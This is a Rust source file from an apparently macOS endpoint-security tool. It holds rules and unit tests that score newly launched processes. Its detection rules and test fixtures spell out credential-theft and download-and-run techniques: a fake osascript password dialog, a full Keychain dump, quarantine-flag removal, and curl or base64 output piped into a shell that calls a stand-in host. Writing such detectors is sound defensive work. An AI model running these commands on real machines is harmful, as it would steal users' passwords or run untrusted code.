//! Rules for a program that just started. They look at the command line, the
//! signature and where it runs from. Used by the process watcher (polling) and
//! by the Endpoint Security client (every exec).

use vogter_model::{Activity, ActivityKind, ExecInfo, ProcessInfo, Severity};

use crate::{process, suspicious_location};

/// Programs that run a script given as an argument.
const SCRIPT_RUNNERS: &[&str] = &[
    "sh",
    "bash",
    "zsh",
    "dash",
    "ksh",
    "perl",
    "ruby",
    "node",
    "osascript",
    "php",
    "tclsh",
];
const SHELLS: &[&str] = &["sh", "bash", "zsh", "dash", "ksh"];

const ADVICE_PASSWORD_DIALOG: &str = "Real macOS password prompts come from the system, not from scripts. \
If you didn't just run a script that needs your password, don't type it in. \
Note which program started it (below), quit it, and check startup items and recent downloads.";
const ADVICE_KEYCHAIN: &str = "Keychain passwords are being read from the command line. \
Fine if it's your own script or a developer tool you use (e.g. a credential helper). \
Otherwise, find what started it and change the affected passwords.";
const ADVICE_QUARANTINE: &str = "The quarantine flag is how macOS knows a file came from the internet and should be checked by Gatekeeper. \
Fine if you just did this yourself to open an app you trust; otherwise something is trying to skip that check.";
const ADVICE_GATEKEEPER: &str = "Gatekeeper blocks unsigned apps from the internet. Turning it off is rarely needed. \
Re-enable it with `sudo spctl --global-enable` unless you did this on purpose.";
const ADVICE_ACCOUNTS: &str = "User accounts or admin group membership are being changed. \
Check System Settings → Users & Groups for accounts you don't recognise.";
const ADVICE_LAUNCHCTL: &str =
    "A background job is being registered. Vogter will show it under startup items if it persists.";
const ADVICE_PIPE: &str = "A script is downloaded and run without being saved or checked — a common way installers work, and a common way malware gets in. \
Fine if you just pasted an install command from a site you trust.";
const ADVICE_BASE64: &str = "Hidden (encoded) code is being run. Legitimate tools rarely do this; malware often does to avoid detection. \
Look at what started it and consider quitting it.";
const ADVICE_SCRIPT_LOCATION: &str = "A script is running from a temp, Downloads or hidden folder — places malware likes to use. \
Fine if it's a tool you're using right now (installers and build tools sometimes do this).";
const ADVICE_SYNTHETIC_KEYS: &str = "A script is sending keystrokes to other apps. Fine for automation tools you set up; otherwise it could be controlling your Mac.";

/// `None` when nothing about this launch is worth recording.
pub fn assess_exec(e: &ExecInfo) -> Option<Activity> {
    let cmd = e.command_line();
    let lower = cmd.to_lowercase();
    let name = e.name();
    let mut best: Option<(Severity, String, Option<&str>)> = None;
    let mut consider = |sev: Severity, why: String, advice: Option<&'static str>| {
        if best.as_ref().is_none_or(|(s, ..)| sev > *s) {
            best = Some((sev, why, advice));
        }
    };

    match name {
        // Info-stealers (AMOS, Cuckoo, ...) ask for your password with a fake dialog.
        "osascript"
            if lower.contains("hidden answer")
                || (lower.contains("display dialog") && lower.contains("password")) =>
        {
            consider(
                Severity::Critical,
                "Shows a password dialog from a script (a common way to steal your password)"
                    .into(),
                Some(ADVICE_PASSWORD_DIALOG),
            )
        }
        "osascript" if lower.contains("system events") && lower.contains("keystroke") => consider(
            Severity::Medium,
            "A script is typing keystrokes into other apps".into(),
            Some(ADVICE_SYNTHETIC_KEYS),
        ),
        "security" if lower.contains("dump-keychain") => consider(
            Severity::High,
            "Dumps the entire Keychain".into(),
            Some(ADVICE_KEYCHAIN),
        ),
        "security"
            if (lower.contains("find-generic-password")
                || lower.contains("find-internet-password"))
                && lower.contains(" -w") =>
        {
            consider(
                Severity::Medium,
                "Reads a password out of the Keychain".into(),
                Some(ADVICE_KEYCHAIN),
            )
        }
        "xattr"
            if lower.contains("com.apple.quarantine")
                || has_flag(&e.args, &["-c", "-cr", "-rc"]) =>
        {
            consider(
                Severity::Medium,
                "Removes the download quarantine flag (skips Gatekeeper's check)".into(),
                Some(ADVICE_QUARANTINE),
            )
        }
        "spctl" if lower.contains("--master-disable") || lower.contains("--global-disable") => {
            consider(
                Severity::High,
                "Turns Gatekeeper off".into(),
                Some(ADVICE_GATEKEEPER),
            )
        }
        "dscl"
            if ["-create", "-passwd", "-append"]
                .iter()
                .any(|f| lower.contains(f)) =>
        {
            consider(
                Severity::Medium,
                "Changes user accounts or group membership".into(),
                Some(ADVICE_ACCOUNTS),
            )
        }
        "sysadminctl" if lower.contains("-adduser") || lower.contains("-resetpasswordfor") => {
            consider(
                Severity::Medium,
                "Creates a user account or resets a password".into(),
                Some(ADVICE_ACCOUNTS),
            )
        }
        "launchctl" if lower.contains(" load ") || lower.contains(" bootstrap ") => consider(
            Severity::Low,
            "Registers a background job".into(),
            Some(ADVICE_LAUNCHCTL),
        ),
        _ => {}
    }

    if SHELLS.contains(&name) || name.starts_with("python") {
        if pipeline_into_shell(&lower, &["base64 -d", "base64 --decode", "base64 -D"]) {
            consider(
                Severity::High,
                "Decodes hidden (base64) code and runs it".into(),
                Some(ADVICE_BASE64),
            );
        } else if pipeline_into_shell(&lower, &["curl ", "wget "]) {
            consider(
                Severity::Medium,
                "Downloads a script and runs it immediately".into(),
                Some(ADVICE_PIPE),
            );
        }
    }
    if (SCRIPT_RUNNERS.contains(&name) || name.starts_with("python"))
        && let Some(script) = script_argument(&e.args)
        && let Some(loc) = suspicious_location(script)
    {
        consider(
            Severity::High,
            format!("Runs a script from {loc}"),
            Some(ADVICE_SCRIPT_LOCATION),
        );
    }

    // Signature and location rules shared with the periodic scan.
    let as_process = ProcessInfo {
        pid: e.pid,
        ppid: e.ppid,
        uid: e.uid,
        name: name.to_string(),
        path: Some(e.path.clone()),
        exe_exists: true,
        signing: e.signing.clone(),
    };
    if let Some(f) = process(&as_process) {
        consider(f.severity, f.title, None);
    }

    let (severity, why, advice) = best?;
    if severity < Severity::Low {
        return None;
    }
    let mut detail = format!("`{cmd}`");
    if let Some(parent) = &e.parent_path {
        detail.push_str(&format!(" — started by {parent}"));
    }
    let mut a = Activity::new(
        ActivityKind::ProcessStarted,
        severity,
        format!("{name}: {why}"),
    )
    .detail(detail)
    .from_exec(e);
    a.advice = advice
        .map(str::to_string)
        .or_else(|| Some(signature_advice(e)));
    Some(a)
}

fn signature_advice(e: &ExecInfo) -> String {
    format!(
        "This program is {}. Apps from the App Store or identified developers are signed and notarized by Apple; \
programs you built yourself or installed with tools like Homebrew often aren't. \
If you don't recognise it, look at where it lives and what started it, and quit it if in doubt.",
        e.signing.describe()
    )
}

/// The script file a runner was given: the first argument that isn't a flag.
/// `-c`/`-e` mean the code is inline, so there is no script file.
fn script_argument(args: &[String]) -> Option<&str> {
    for a in args.iter().skip(1) {
        match a.as_str() {
            "-c" | "-e" | "-E" | "--eval" | "-p" | "--print" => return None,
            s if s.starts_with('-') => continue,
            s => return Some(s),
        }
    }
    None
}

/// True if one of `sources` feeds, within the same pipeline, into a shell:
/// `curl -fsSL url | bash`, `echo … | base64 -d | sh`. Separators (`;`, `&&`,
/// `||`, newlines) end a pipeline, so unrelated mentions don't count.
pub(crate) fn pipeline_into_shell(cmd: &str, sources: &[&str]) -> bool {
    cmd.split(['\n', ';'])
        .flat_map(|chunk| chunk.split("&&"))
        .flat_map(|chunk| chunk.split("||"))
        .any(|pipeline| {
            let stages: Vec<&str> = pipeline.split('|').map(str::trim).collect();
            stages.iter().enumerate().any(|(i, stage)| {
                sources.iter().any(|src| {
                    stage.starts_with(src.trim_end()) || stage.contains(&format!(" {src}"))
                }) && stages[i + 1..].iter().any(|later| {
                    let first = later
                        .split_whitespace()
                        .find(|w| *w != "sudo" && !w.starts_with('-'));
                    first.is_some_and(|w| SHELLS.contains(&w.rsplit('/').next().unwrap_or(w)))
                })
            })
        })
}

fn has_flag(args: &[String], flags: &[&str]) -> bool {
    args.iter().skip(1).any(|a| flags.contains(&a.as_str()))
}

#[cfg(test)]
mod tests {
    use super::*;
    use vogter_model::{SignatureKind, Signing};

    fn exec(path: &str, args: &[&str], kind: SignatureKind) -> ExecInfo {
        ExecInfo {
            pid: 100,
            ppid: 1,
            uid: 501,
            path: path.into(),
            args: args.iter().map(|s| s.to_string()).collect(),
            signing: Signing {
                kind,
                identifier: None,
                team_id: None,
                notarized: false,
            },
            parent_path: None,
        }
    }

    fn severity(e: &ExecInfo) -> Option<Severity> {
        assess_exec(e).map(|a| a.severity)
    }

    #[test]
    fn fake_password_prompt() {
        let e = exec(
            "/usr/bin/osascript",
            &[
                "osascript",
                "-e",
                r#"display dialog "macOS needs your password" default answer "" with hidden answer"#,
            ],
            SignatureKind::Apple,
        );
        assert_eq!(severity(&e), Some(Severity::Critical));
    }

    #[test]
    fn ordinary_apple_tools_are_quiet() {
        assert_eq!(
            severity(&exec("/bin/ls", &["ls", "-la"], SignatureKind::Apple)),
            None
        );
        assert_eq!(
            severity(&exec(
                "/usr/bin/osascript",
                &["osascript", "-e", "beep"],
                SignatureKind::Apple
            )),
            None
        );
        assert_eq!(
            severity(&exec(
                "/usr/bin/security",
                &["security", "list-keychains"],
                SignatureKind::Apple
            )),
            None
        );
    }

    #[test]
    fn curl_pipe_shell() {
        let e = exec(
            "/bin/bash",
            &["bash", "-c", "curl -fsSL https://x.example/i.sh | bash"],
            SignatureKind::Apple,
        );
        assert_eq!(severity(&e), Some(Severity::Medium));
        let e = exec(
            "/bin/zsh",
            &["zsh", "-c", "echo aGk= | base64 -d | sh"],
            SignatureKind::Apple,
        );
        assert_eq!(severity(&e), Some(Severity::High));
    }

    #[test]
    fn keychain_and_quarantine() {
        let e = exec(
            "/usr/bin/security",
            &["security", "dump-keychain", "-d"],
            SignatureKind::Apple,
        );
        assert_eq!(severity(&e), Some(Severity::High));
        let e = exec(
            "/usr/bin/xattr",
            &["xattr", "-d", "com.apple.quarantine", "/tmp/x.app"],
            SignatureKind::Apple,
        );
        assert_eq!(severity(&e), Some(Severity::Medium));
    }

    #[test]
    fn unsigned_binary_in_tmp() {
        let e = exec("/private/tmp/.x/update", &["update"], SignatureKind::AdHoc);
        assert_eq!(severity(&e), Some(Severity::High));
    }

    #[test]
    fn no_false_alarm_for_mentions_or_output_paths() {
        // A shell command that mentions curl and pipes elsewhere is not curl|sh.
        let e = exec(
            "/bin/zsh",
            &[
                "zsh",
                "-c",
                "source snap.sh; alias get='curl -s'; ls | grep x | sort",
            ],
            SignatureKind::Apple,
        );
        assert_eq!(severity(&e), None);
        // curl writing its output to a temp folder is not "running a script from" it.
        let e = exec(
            "/usr/bin/curl",
            &[
                "curl",
                "-s",
                "-o",
                "/private/tmp/resp.json",
                "https://example.com",
            ],
            SignatureKind::Apple,
        );
        assert_eq!(severity(&e), None);
        // node with an output path in /tmp: the script itself is elsewhere.
        let e = exec(
            "/opt/node",
            &[
                "node",
                "/Users/me/app/node_modules/.bin/remotion",
                "still",
                "/private/tmp/out.png",
            ],
            SignatureKind::ThirdParty,
        );
        assert_eq!(severity(&e), None);
        // Inline code (-c) has no script file.
        let e = exec(
            "/bin/bash",
            &["bash", "-c", "echo hi", "/tmp/x"],
            SignatureKind::Apple,
        );
        assert_eq!(severity(&e), None);
    }

    #[test]
    fn real_pipelines_still_caught() {
        let e = exec(
            "/bin/sh",
            &[
                "sh",
                "-c",
                "cd /tmp && curl -fsSL https://x.example/i.sh | sudo bash",
            ],
            SignatureKind::Apple,
        );
        assert_eq!(severity(&e), Some(Severity::Medium));
        let a = assess_exec(&e).unwrap();
        assert!(a.advice.unwrap().contains("install command"));
    }

    #[test]
    fn script_from_downloads() {
        let e = exec(
            "/usr/bin/python3",
            &["python3", "/Users/me/Downloads/run.py"],
            SignatureKind::Apple,
        );
        assert_eq!(severity(&e), Some(Severity::High));
    }
}
